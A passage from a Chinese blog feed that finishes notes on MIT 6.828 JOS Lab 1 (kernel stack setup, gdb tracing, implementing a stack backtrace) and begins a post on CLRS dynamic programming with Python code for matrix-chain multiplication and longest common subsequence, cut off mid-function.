<p>输出是 <code>He110 World</code>。 这很神奇。首先 %x 是指十六进制，所以将 57616 转为十六进制就是 <code>e110</code>。在看后面， &amp;i 是指 i 的地址， %s是指输出为字符串，所以输出的应该是变量i所在地址的字符串。其实就是将i转换为字符串来输出。因为x86是小端模式，并且是int类型，所以存放的方式是四个字节，所以就会将i拆分开来，变成 0x72, 0x6c, 0x64, 0x00. 所以转换为字符就是rld\0，所以得到了上面的输出结果。</p>
<p>运行以下代码。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>结果是 <code>x=3 y=-267380708</code>，y出问题是因为没有被指定值，所以输出的是一个不确定的值。</p>
<h3 id="u5806_u6808"><a href="#u5806_u6808" class="headerlink" title="堆栈"></a>堆栈</h3><p>最后这部分，要研究C语言是如何在x86框架上使用堆栈的。需要查看指令寄存器(IP)的值的变化。</p>
<h4 id="Exercise_9"><a href="#Exercise_9" class="headerlink" title="Exercise 9"></a>Exercise 9</h4><p>研究内核是在哪初始化堆栈，找出堆栈存放在内存的位置。内核是如何保存一块空间给堆栈的？堆栈指针指向这块区域的哪儿？</p>
<p>看了几个文件以后，发现在 <code>kern/entry.S</code> 中提到了设置堆指针和栈指针。</p>
<pre><code>    # Clear the frame pointer register (EBP)
    # so that once we get into debugging C code,
    # stack backtraces will be terminated properly.
    movl    $0x0,%ebp            # nuke frame pointer

    # Set the stack pointer
    movl    $(bootstacktop),%esp
</code></pre><p>为了查看堆的位置，所以要使用gdb，同样还是 <code>b *0x10000c</code> 打断点进入 entry。 si 一步步执行，在 <code>0x10002d:    jmp    *%eax</code> 之后，下一条指令变为 <code>0xf010002f &lt;relocated&gt;:    mov    $0x0,%ebp</code>。其实地址应该还是 0x10002f，所以这里的 0xf010002f 是因为开启的虚拟地址。</p>
<p>通过 gdb 发现 <code>0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp</code>， 也就是说%esp也就是bootstacktop的值为0xf0110000。其中 <code>kern/entry.S</code> 的 <code>KSTKSIZE</code> 应该就是堆栈的大小，通过跳转，发现在 <code>inc/memlayout.h</code> 里提到了堆栈。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Kernel stack.</span>
<span class="token macro property">#<span class="token directive keyword">define</span> KSTACKTOP    KERNBASE</span>
<span class="token macro property">#<span class="token directive keyword">define</span> KSTKSIZE    (8*PGSIZE)           </span><span class="token comment" spellcheck="true">// size of a kernel stack</span>
<span class="token macro property">#<span class="token directive keyword">define</span> KSTKGAP        (8*PGSIZE)           </span><span class="token comment" spellcheck="true">// size of a kernel stack guard</span>
</code></pre>
<p><code>PGSIZE</code> 定义在 <code>inc/mmu.h</code> 中，值为 4096，所以 KSTKSIZE 为 32KB。 使用 <code>info registers</code> 可以查出esp和ebp的值。最高地址为bootstacktop的值，也就是0xf0110000。</p>
<p>x86堆栈指针(esp寄存器)指向堆栈正在使用的最低位置，低于这个位置的空间还没使用。ebp寄存器(基址指针寄存器)与程序有关。详细的内容可以看 CSAPP。</p>
<h4 id="Exercise_10"><a href="#Exercise_10" class="headerlink" title="Exercise 10"></a>Exercise 10</h4><p>研究 <code>obj/kern/kernel.asm</code> 中 test_backtrace 向堆栈里压入的信息。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Test the stack backtrace function (lab 1 only)</span>
<span class="token keyword">void</span>
<span class="token function">test_backtrace</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"entering test_backtrace %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">test_backtrace</span><span class="token punctuation">(</span>x<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">mon_backtrace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"leaving test_backtrace %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>使用单步调试和 info registers 来查看esp和ebp的变化。</p>
<p>运行test_backtrace前，</p>
<pre><code>esp            0xf010ffdc    0xf010ffdc
ebp            0xf010fff8    0xf010fff8
</code></pre><p>执行的操作为</p>
<pre><code>0xf0100040 &lt;test_backtrace&gt;:    push   %ebp  #栈底指针ebp压入栈中
0xf0100041 &lt;test_backtrace+1&gt;:    mov    %esp,%ebp  #将栈顶指针esp指向栈底指针ebp
0xf0100043 &lt;test_backtrace+3&gt;:    push   %ebx  #压入ebx基底寄存器
0xf0100044 &lt;test_backtrace+4&gt;:    sub    $0xc,%esp  #栈顶指针esp向低地址移动0xc也就是12bytes。
0xf0100047 &lt;test_backtrace+7&gt;:    mov    0x8(%ebp),%ebx  
0xf010004a:    53                       push   %ebx #将%ebp+8位置的变量压入栈中，为之后的调用做准备。
</code></pre><p>总之，这段程序算是递归，递归就是ebp存放返回地址，esp是存放调用时的参数。</p>
<p>现在需要实现mon_backtrace()这个函数，需要显示ebp，eip 和 args。ebp是基址指针，eip是返回指令指针。</p>
<p>简单实现backtrace，实现效果如下</p>
<p><img src="17.png" alt=""></p>
<p>实现如下。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">mon_backtrace</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">struct</span> Trapframe <span class="token operator">*</span>tf<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Your code here.</span>
    <span class="token keyword">int</span> j<span class="token punctuation">;</span>
    uint32_t ebp <span class="token operator">=</span> <span class="token function">read_ebp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint32_t eip <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"Stack backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ebp <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"  ebp:0x%08x eip:0x%08x args:"</span><span class="token punctuation">,</span> ebp<span class="token punctuation">,</span> eip<span class="token punctuation">)</span><span class="token punctuation">;</span>
        uint32_t <span class="token operator">*</span>args <span class="token operator">=</span> <span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> j <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"%08x "</span><span class="token punctuation">,</span> args<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        eip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        ebp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="Exercise_11"><a href="#Exercise_11" class="headerlink" title="Exercise 11"></a>Exercise 11</h4><p>修改上面实现的backtrace，要显示详细的函数地址。可以使用 <code>kern/kdebug.c</code> 的 debuginfo_eip()。在查看debuginfo_eip时发现其中有一段代码需要填写。这段代码是填写eip_line。这里用到了写好的二分查找。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Search within [lline, rline] for the line number stab.</span>
    <span class="token comment" spellcheck="true">// If found, set info->eip_line to the right line number.</span>
    <span class="token comment" spellcheck="true">// If not found, return -1.</span>
    <span class="token comment" spellcheck="true">//</span>
    <span class="token comment" spellcheck="true">// Hint:</span>
    <span class="token comment" spellcheck="true">//    There's a particular stabs type used for line numbers.</span>
    <span class="token comment" spellcheck="true">//    Look at the STABS documentation and &lt;inc/stab.h> to find</span>
    <span class="token comment" spellcheck="true">//    which one.</span>
    <span class="token comment" spellcheck="true">// Your code here.</span>
    <span class="token function">stab_binsearch</span><span class="token punctuation">(</span>stabs<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lline<span class="token punctuation">,</span> <span class="token operator">&amp;</span>rline<span class="token punctuation">,</span> N_SLINE<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>lline <span class="token operator">&lt;=</span> rline<span class="token punctuation">)</span><span class="token punctuation">{</span>
        info<span class="token operator">-></span>eip_line <span class="token operator">=</span> stabs<span class="token punctuation">[</span>rline<span class="token punctuation">]</span><span class="token punctuation">.</span>n_desc<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
        info<span class="token operator">-></span>eip_line <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
</code></pre>
<p>关于 stab 相关内容，查看第三个参考资料，实话说，我对于stab理解的比较模糊。</p>
<h4 id="Exercise_12"><a href="#Exercise_12" class="headerlink" title="Exercise 12"></a>Exercise 12</h4><p>将backtrace嵌入终端中，使其可以被调用。只需要修改 <code>kern/monitor.c</code> 的</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> Command commands<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span> <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"Display this list of commands"</span><span class="token punctuation">,</span> mon_help <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> <span class="token string">"kerninfo"</span><span class="token punctuation">,</span> <span class="token string">"Display information about the kernel"</span><span class="token punctuation">,</span> mon_kerninfo <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> <span class="token string">"backtrace"</span><span class="token punctuation">,</span> <span class="token string">"Display a listing of function call frames"</span><span class="token punctuation">,</span> mon_backtrace<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="u6700_u540E_u7684_u6700_u540E"><a href="#u6700_u540E_u7684_u6700_u540E" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>至此,lab1已经算是完成了，简单了解了操作系统的启动过程，很充实很值得思考。</p>
<p><img src="18.png" alt=""></p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/fatsheep9146/category/769143.html" target="_blank" rel="external">MIT 6.828 JOS 操作系统学习笔记</a></p>
<p><a href="http://blog.chinaunix.net/uid-24585655-id-2125525.html" target="_blank" rel="external">AT&amp;T_GCC_ASM简单介绍</a></p>
<p><a href="http://blog.csdn.net/roger__wong/article/details/8623941" target="_blank" rel="external">JOS学习笔记（四）</a></p>
]]></content>
    
    <summary type="html">
    
      MIT6.828
    
    </summary>
    
    
      <category term="MIT6.828" scheme="http://xinqiu.me/tags/MIT6-828/"/>
    
  </entry>
  
  <entry>
    <title>算法导论动态规划学习</title>
    <link href="http://xinqiu.me/2016/10/04/CLRS-2/"/>
    <id>http://xinqiu.me/2016/10/04/CLRS-2/</id>
    <published>2016-10-03T16:00:00.000Z</published>
    <updated>2016-10-06T10:47:15.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<p>动态规划方法通常是用来求解<strong>最优化问题</strong>(optimization problem)。比起分治方法，动态规划对于子问题只求解一次，算是用空间换时间。</p>
<p>书中提到了设计动态规划算法的4个步骤：</p>
<ol>
<li>刻画一个最优解的结构特此</li>
<li>递归地定义最优解的值</li>
<li>计算最优解的值，通常采用自底向上的方法</li>
<li>利用计算出的信息构造一个最优解</li>
</ol>
<a id="more"></a>
<h2 id="u94A2_u6761_u5207_u5272"><a href="#u94A2_u6761_u5207_u5272" class="headerlink" title="钢条切割"></a>钢条切割</h2><p>这个算是比较简单的应用动态规划的例子。只需要用一个一维数组保存最有解就可以了。书中提到一个子问题图，很形象的能表达出各个子问题之间的关系。这里钢条切割使用才思想是分两块，左边一部分完全不切割，右边随便切割，然后比较产生的利润最大的组合，所以右边就变成了子问题。</p>
<h2 id="u77E9_u9635_u94FE_u4E58_u6CD5"><a href="#u77E9_u9635_u94FE_u4E58_u6CD5" class="headerlink" title="矩阵链乘法"></a>矩阵链乘法</h2><p>首先需要知道一个概念是只有两个矩阵A和B相容，即A的列数等于B的行数时，才能相乘。矩阵链乘法问题就是求完全括号化的方案，不同的括号方法产生不同次数的标量乘法。首先可以得到一个穷举的算法思路，令$P(n)$表示可供选择的括号化方案的数量，当$n=1$时，显然只有一种完全括号化方案，当$n \geqslant 2$时，完全括号化的矩阵乘积可描述为两个完全括号化的部分积相乘的形式，而两个部分积的划分点在第$k$个矩阵和第$k+1$个矩阵之间。所以可以得到如下递归公式：<br><img src="1.gif" alt=""><br>当然这个需要优化。所以引入储存子问题解的变量m，m[i,j]表示计算矩阵$A_{i,j}$所需标量乘法次数的最小值。假设 $A_{i}A_{i+1}\cdots A_{j}$ 的最优括号化方案的分割点在矩阵$A_{k}$和$A_{k+1}$之间，其中$i\leqslant k &lt;j$。那么，m[i,j]等于计算 $A_{i..k}$和 $A_{k+1..j}$的代价加上两者相乘的代价的最小值。因此得到<br>$$ m[i,j]=m[i,k]+m[k+1,j]+p_{i-1}p_{k}p_{j}$$<br>因为不知道$k$的具体值，所以$k$有$ j-i $种可能，所以<br><img src="2.gif" alt=""><br>采用自底向上表格法代替上面公式的递归算法来计算最优代价。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">MaxtrixChainOrder</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
    m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>
    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> l <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            j <span class="token operator">=</span> i <span class="token operator">+</span> l <span class="token operator">-</span><span class="token number">1</span>
            m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span>maxint
            <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
                q <span class="token operator">=</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span>m<span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> q <span class="token operator">&lt;</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
                    m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> q
                    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k
    <span class="token keyword">return</span> m<span class="token punctuation">,</span> s

m<span class="token punctuation">,</span> s <span class="token operator">=</span> MaxtrixChainOrder<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'m:'</span>
<span class="token keyword">print</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'s:'</span>
<span class="token keyword">print</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'矩阵链乘法的方案是:'</span><span class="token punctuation">,</span>

<span class="token keyword">def</span> <span class="token function">PrintOptimalParens</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> j<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'A'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        ret <span class="token operator">+=</span> <span class="token string">'('</span>
        ret <span class="token operator">+=</span> PrintOptimalParens<span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
        ret <span class="token operator">+=</span> PrintOptimalParens<span class="token punctuation">(</span>s<span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span>
        ret <span class="token operator">+=</span>  <span class="token string">')'</span>
        <span class="token keyword">return</span> ret

<span class="token keyword">print</span> PrintOptimalParens<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
</code></pre>
<p>得到以下输出</p>
<pre><code>m:
[0, 15750, 7875, 9375, 11875, 15125]
[0, 0, 2625, 4375, 7125, 10500]
[0, 0, 0, 750, 2500, 5375]
[0, 0, 0, 0, 1000, 3500]
[0, 0, 0, 0, 0, 5000]
[0, 0, 0, 0, 0, 0]
s:
[0, 0, 0, 2, 2, 2]
[0, 0, 1, 2, 2, 2]
[0, 0, 0, 2, 2, 2]
[0, 0, 0, 0, 3, 4]
[0, 0, 0, 0, 0, 4]
[0, 0, 0, 0, 0, 0]
矩阵链乘法的方案是: ((A0(A1A2))((A3A4)A5))
</code></pre><h2 id="u52A8_u6001_u89C4_u5212_u539F_u7406"><a href="#u52A8_u6001_u89C4_u5212_u539F_u7406" class="headerlink" title="动态规划原理"></a>动态规划原理</h2><h3 id="u6700_u4F18_u5B50_u7ED3_u6784"><a href="#u6700_u4F18_u5B50_u7ED3_u6784" class="headerlink" title="最优子结构"></a>最优子结构</h3><p>书中说了4条通用模式，简单点概况就是每个问题能被分成几个子问题，这几个子问题有解且都是最优解，那么这个问题就是这几个最优解的结合。构建最优子结构需要考虑这两个方面：</p>
<ol>
<li>原问题的最优解设计多少个子问题</li>
<li>确定最优解使用哪些子问题时，要考察多少种选择</li>
</ol>
<p>和递归不同，因为递归太深会出现异常。动态规划确实反过来，自底向上的使用最优子结构。也就是说，首先求得子问题的最优解，然后求原问题的最优解。</p>
<h3 id="u91CD_u53E0_u5B50_u95EE_u9898"><a href="#u91CD_u53E0_u5B50_u95EE_u9898" class="headerlink" title="重叠子问题"></a>重叠子问题</h3><p>如果递归算法反复求解相同的子问题，这就是最优化问题具有重叠子问题性质。动态规划对每个子问题求解一次，将解存入一个表中，这样当再次需要这个子问题时直接查表。</p>
<p>这里也提到了一种带备忘的自顶到下动态规划算法，时间复杂度和自底向上的动态规划算法一样。</p>
<h2 id="u6700_u957F_u516C_u5171_u5B50_u5E8F_u5217"><a href="#u6700_u957F_u516C_u5171_u5B50_u5E8F_u5217" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>同之前的矩阵链乘法问题相似，还是要建立最优解的递归式。</p>
<p><img src="3.png" alt=""></p>
<p>书中的图15-8很形象,列举出了X=[A, B, C, B, D, A, B], Y=[B, D, C, A, B, A]得到的表c和表b。</p>
<p><img src="4.png" alt=""></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">LCSLength</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> len<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>y<span class="token punctuation">)</span>
    b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> x<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">==</span> y<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
                b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'↖'</span>
            <span class="token keyword">elif</span> c<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
                b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'↑'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span>
                b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'←'</span>
    <span class="token keyword">return</span> c<span class="token punctuation">,</span> b

<span class="token keyword">def</span> <span class="token function">PrintLCS</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span>
    <span class="token keyword">if</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'↖'</span><span class="token punctuation">:</span>
        PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i<span class="token number">-1</span><span class="token punctuation">,</span> j<span class="token number">-1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> x<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token keyword">elif</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'↑'</span><span class="token punctuation">:</span>
        PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
